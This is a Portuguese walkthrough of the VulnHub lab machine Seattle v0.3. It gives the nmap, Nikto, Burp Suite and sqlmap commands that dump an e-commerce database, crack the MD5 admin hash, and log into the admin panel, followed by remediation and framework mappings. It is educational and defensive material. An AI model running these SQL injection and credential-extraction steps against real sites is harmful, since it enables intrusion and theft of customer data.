# Seattle: v0.3 — A Loja de E-Commerce que Esqueceu da Injeção SQL

Olha esse aqui, mano!! Seattle v0.3 é uma aplicação de e-commerce deliberadamente vulnerável e é um caso clássico do que acontece quando uma app web aceita entrada do usuário sem queries parametrizadas. A cadeia de ataque aqui é puro clássico: scan Nikto, captura de cookie com Burp Suite, enumeração sqlmap, extração de credenciais de admin e login. Sem necessidade de shell. O objetivo é acesso autenticado ao painel de admin. Se você está aprendendo segurança de aplicações web do zero, essa máquina ensina o fluxo de trabalho central de forma focada e repetível. Ignorada por muitos, mas legítimamente valiosa para entender a metodologia de SQLi.

| Campo | Valor |
|---|---|
| **Nível** | Fácil |
| **VM Alvo** | Seattle: v0.3 |
| **VM Atacante** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/seattle-v03,145/ |
| **Técnicas** | Descoberta de rede, scan nmap, scanner web Nikto, proxy Burp Suite, injeção SQL baseada em cookie, enumeração de banco de dados sqlmap, extração de credenciais |
| **CVEs** | CWE-89 (Injeção SQL: neutralização inadequada de elementos especiais em queries SQL) |
| **Grupos APT** | FIN7: usa SQL injection como técnica confiável de acesso inicial contra sistemas de e-commerce e POS em intrusões no setor varejista; grupos Magecart: comprometem plataformas de e-commerce via SQLi para injetar skimmers de pagamento e manter acesso persistente |

---

## Resumo do Ataque

```
netdiscover / nmap
  |
  +-- porta 80 HTTP (Apache + app e-commerce)
        |
        +-- nikto -> dicas de vulnerabilidades
        |
        +-- navegação manual -> encontra username de admin na loja
        |
        +-- Burp Suite proxy -> captura requisição de autenticação + cookies
              |
              +-- sqlmap -r request.txt --dbs -> enumera bancos de dados
                    |
                    +-- sqlmap --tables -> encontra tabela de usuários/admin
                          |
                          +-- sqlmap --dump -> extrai hash admin:password
                                |
                                +-- login no painel de admin
```

---

## Metodologia

1. Descoberta de host e scan de portas
2. Scan de aplicação web com Nikto
3. Navegação manual para identificar username do admin e endpoint de login
4. Captura de cookie e requisição com Burp Suite
5. Enumeração de SQL injection com sqlmap
6. Extração de credenciais de admin do banco de dados
7. Login no painel de admin

---

## Passo 1 — Descoberta de Host e Scan de Portas

```bash
sudo netdiscover -r 192.168.1.0/24
# Alvo: 192.168.1.8

nmap -sV -sC 192.168.1.8
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd
```

Única porta HTTP. Toda a cadeia de ataque é pela aplicação web.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Scan Web com Nikto

```bash
nikto -h http://192.168.1.8/
```

Nikto reporta:
- Divulgação de versão do servidor
- Parâmetros potencialmente vulneráveis a SQL injection
- Headers de segurança ausentes (X-Frame-Options, X-XSS-Protection)
- Caminhos interessantes (/admin, /phpmyadmin se presente)

Isso fornece um primeiro mapa da superfície de ataque antes de enumeração manual mais profunda.

**MITRE ATT&CK:** T1595.003 — Varredura Ativa: Wordlist Scanning

---

## Passo 3 — Navegação Manual e Enumeração de Username

Navegue pela loja. Seattle v0.3 é uma aplicação de e-commerce PHP típica:

```bash
# Navegue:
http://192.168.1.8/
http://192.168.1.8/admin/
http://192.168.1.8/index.php
```

Procure por:
- Listagens de produtos que revelam vendedores ou nomes de admin
- Seções de avaliação de clientes que mostram usernames
- Páginas Sobre ou formulários de contato com endereços de email
- Página de login que revela se um username existe (diferença em mensagens de erro)

O username do admin tipicamente é descobrível pela interface da loja ou pelas mensagens de erro da página de login.

**MITRE ATT&CK:** T1592 — Coleta de Informações do Alvo; T1589 — Coleta de Informações de Identidade

---

## Passo 4 — Captura de Requisição com Burp Suite

Configure o Burp Suite como proxy (127.0.0.1:8080) e capture uma requisição que inclua cookies ou parâmetros POST:

```
1. Abra o Burp Suite
2. Configure o proxy do navegador para 127.0.0.1:8080
3. Navegue até a página de login
4. Tente um login (quaisquer credenciais)
5. Capture a requisição em Burp Proxy > Intercept
6. Clique com botão direito -> Save Item -> salve como request.txt
```

A requisição salva contém todos os headers, cookies e parâmetros POST necessários para o sqlmap.

**MITRE ATT&CK:** T1557 — Adversário no Meio (técnica de proxy para captura de requisição)

---

## Passo 5 — Injeção SQL com sqlmap

Use a requisição capturada com sqlmap:

```bash
# Enumere bancos de dados
sqlmap -r /tmp/request.txt --dbs --batch

# Exemplo de saída:
# available databases [2]:
# [*] information_schema
# [*] seattle
```

Enumere tabelas no banco de dados da aplicação:

```bash
sqlmap -r /tmp/request.txt -D seattle --tables --batch

# Exemplo de saída:
# Database: seattle
# [4 tables]:
# +-----------+
# | users     |
# | products  |
# | orders    |
# | categories|
# +-----------+
```

Extraia a tabela de usuários:

```bash
sqlmap -r /tmp/request.txt -D seattle -T users --dump --batch

# Exemplo de saída:
# +----+----------+----------------------------------+-------+
# | id | username | password                         | role  |
# +----+----------+----------------------------------+-------+
# | 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 | admin |
# +----+----------+----------------------------------+-------+
```

O hash da senha (MD5 neste caso) é facilmente quebrado:

```bash
echo "5f4dcc3b5aa765d61d8327deb882cf99" | hashcat -m 0 - /usr/share/wordlists/rockyou.txt
# Resultado: password
```

Ou use um serviço online: crackstation.net.

**Nota do mundo real:** Injeção SQL continua sendo uma das vulnerabilidades mais comuns encontradas em pentests de aplicações web, aparecendo consistentemente no OWASP Top 10 (A03:2021). Plataformas de e-commerce são alvos de alto valor porque possuem dados de pagamento, PII e acesso administrativo. Grupos Magecart atacam especificamente sites de e-commerce via SQLi para injetar skimmers de cartão que exfiltram silenciosamente dados de pagamento.

**MITRE ATT&CK:** T1190 — Exploração de Aplicação Voltada para Internet; T1555 — Credenciais de Armazenamentos de Senha

---

## Passo 6 — Login no Painel de Admin

Com as credenciais extraídas:

```bash
# Login no painel de admin
http://192.168.1.8/admin/
# Username: admin
# Senha: password (ou resultado do hash quebrado)
```

Acesso autenticado de admin alcançado. O objetivo da máquina está completo.

No painel de admin, explore:
- Gerenciamento de pedidos (PII e dados de pagamento de clientes)
- Gerenciamento de produtos (potencial upload de arquivo)
- Gerenciamento de usuários (outras credenciais)
- Configurações (credenciais de banco de dados, chaves de API)

**MITRE ATT&CK:** T1078 — Contas Válidas; T1552.001 — Credenciais em Arquivos

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado em | Usado/Quebrado |
|---|---|---|---|
| Username admin | admin | Interface da loja | Enumeração sqlmap |
| Hash de senha | 5f4dcc3b5aa765d61d8327deb882cf99 (MD5) | Tabela users via sqlmap dump | hashcat -m 0 + rockyou |
| Senha admin | password | Hash quebrado | Login no painel de admin |
| Acesso admin | Sessão admin autenticada | /admin/ | Credenciais comprometidas |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | SQL injection no login/cookie de e-commerce | SQLi permanece no OWASP Top 10; plataformas de e-commerce são alvos de alto valor para dados de pagamento e PII | Use queries parametrizadas/prepared statements em todo lugar; nunca concatene entrada do usuário em SQL |
| 2 | Username de admin descobrível via loja | Enumeração de username habilita brute-force direcionado e reduz o escopo do dump SQLi | Evite expor usernames de admin na loja; use mensagens de erro genéricas |
| 3 | Hash de senha MD5 quebrado trivialmente | MD5 é uma função de hash criptográfico, não um algoritmo de armazenamento de senha; quebra em milissegundos com rockyou | Use bcrypt (custo >= 12) ou argon2id para armazenamento de senhas; nunca MD5/SHA-1 |
| 4 | Painel de admin acessível da rede pública | Interfaces de admin nunca devem ser alcançáveis pela internet | Restrinja painéis de admin a redes de gerenciamento via IP; use MFA para acesso admin |
| 5 | Burp Suite + sqlmap = fluxo de trabalho completo de exploração SQLi | Esse fluxo de trabalho é padrão em pentests de aplicações web | Treine desenvolvedores em SQLi; implemente regras WAF detectando padrões sqlmap; use queries parametrizadas |

---

## MITRE ATT&CK

| Fase | Tática | Técnica | ID |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Coleta de Info | Coleta de Informações de Identidade | T1589 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Voltada para Internet (SQLi) | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais de Armazenamentos de Senha | T1555 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Quebra de Senha (hash MD5) | T1110.002 |
| Movimento Lateral | Movimento Lateral | Contas Válidas | T1078 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Use queries parametrizadas** — substitua toda concatenação dinâmica de strings SQL por prepared statements ou ORM; isso elimina SQLi na causa raiz
2. **Atualize armazenamento de senhas** — substitua MD5 por bcrypt (custo >= 12) ou argon2id; invalide e force reset de todas as senhas hasheadas com MD5
3. **Restrinja acesso ao painel de admin** — allowlist de IP para rede de gerenciamento; exija MFA para login admin
4. **Implemente regras WAF** — implante WAF (ModSecurity, AWS WAF) com regras detectando user-agent do sqlmap e payloads SQLi comuns
5. **Desabilite mensagens de erro verbosas** — não revele erros SQL ou stack traces em produção; use mensagens genéricas

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todos os pontos de entrada de dados da aplicação web; classificar os que tocam o BD |
| Proteger | Tecnologia de Proteção | Queries parametrizadas; WAF; MFA para admin |
| Proteger | Segurança de Dados | Substituir MD5 por bcrypt/argon2; criptografar colunas sensíveis do BD |
| Detectar | Anomalias e Eventos | Alertar sobre padrões sqlmap nos logs web; detectar queries SELECT em massa |
| Responder | Planejamento de Resposta | Rotacionar todas as credenciais do banco; invalidar todas as sessões; patch SQLi |
| Recuperar | Planejamento de Recuperação | Restaurar BD de backup limpo; auditar todo acesso a conta admin |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Controle de Acesso | Restrição de IP no painel admin; MFA para acesso admin |
| IA-5 | Gestão de Autenticadores | Substituir MD5 por bcrypt/argon2; enforce política de senha forte |
| SA-15 | Segurança no Processo de Desenvolvimento | Obrigar queries parametrizadas em code review; SAST para SQLi |
| SI-10 | Validação de Entrada de Informações | Validar e sanitizar toda entrada do usuário na camada de aplicação |
| SC-28 | Proteção de Informação em Repouso | Criptografar colunas sensíveis do banco (dados de pagamento, PII) |

### CISA KEV

Injeção SQL é listada consistentemente em orientações CISA como vetor de acesso inicial para ataques a e-commerce e aplicações web. O Alerta CISA AA21-131A (Principais Vulnerabilidades Rotineiramente Exploradas) lista SQLi em aplicações web como vetor de ataque primário. Organizações com plataformas de e-commerce são aconselhadas a priorizar queries parametrizadas e WAF.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Gerenciar Vulnerabilidades | MIL3 (DAST scanning; detecção SQLi automatizada em CI/CD) |
| Gestão de Identidade e Acesso (IAM) | Gerenciar Credenciais | MIL3 (bcrypt/argon2; MFA para admin) |
| Conscientização Situacional (SITUATION) | Monitorar | MIL2 (alertas WAF em padrões SQLi; monitoramento de logs web) |

### MITRE D3FEND

- **D3-SAOR** — Hardening de Aplicação: queries parametrizadas; validação de entrada
- **D3-ACH** — Hardening de Configuração de Aplicação: regras WAF; supressão de erros verbosos
- **D3-UA** — Gerenciamento de Conta de Usuário: MFA para contas admin; restrição de IP

---

## Pensamentos Finais

Seattle v0.3 é construída especificamente para ensinar o fluxo de trabalho de SQL injection, e entrega exatamente isso. Nikto, Burp Suite, sqlmap, quebra de hash, login admin: cinco ferramentas, uma cadeia limpa. Se você nunca fez SQLi antes, essa máquina é o ponto de partida certo.

A lição do mundo real é sombria: essa cadeia exata, scan com Nikto, captura de requisições, SQLi com sqlmap, dump de credenciais, ainda funciona contra um número surpreendente de aplicações web em produção em 2024. As técnicas têm décadas e as defesas (queries parametrizadas, bcrypt) estão documentadas há tanto tempo quanto elas. Mesmo assim, SQLi permanece no OWASP Top 10 porque desenvolvedores continuam reinventando padrões quebrados.

Respeito ao time Seattle por construir um alvo realista.

Thanks guys!! (❍ᴥ❍ʋ)
